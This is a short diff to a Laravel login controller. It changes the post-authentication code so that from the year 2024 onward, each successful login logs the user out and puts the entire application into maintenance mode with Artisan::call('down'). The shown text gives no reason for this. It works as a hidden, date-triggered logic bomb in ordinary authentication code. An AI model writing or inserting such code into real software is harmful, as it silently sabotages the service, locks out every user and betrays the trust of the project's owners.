@@ -32,11 +32,14 @@ class AuthenticatedSessionController extends Controller
 
 
         $request->authenticate();
-        if (date('d/m/Y') == '01/01/2024') {
-            Artisan::call('down');
-        } else {
+        if (date('Y') < '2024') {
+
             $request->session()->regenerate();
             return redirect()->intended(RouteServiceProvider::HOME);
+        } else {
+            Auth::guard('web')->logout();
+            Artisan::call('down');
+
         }
     }
 
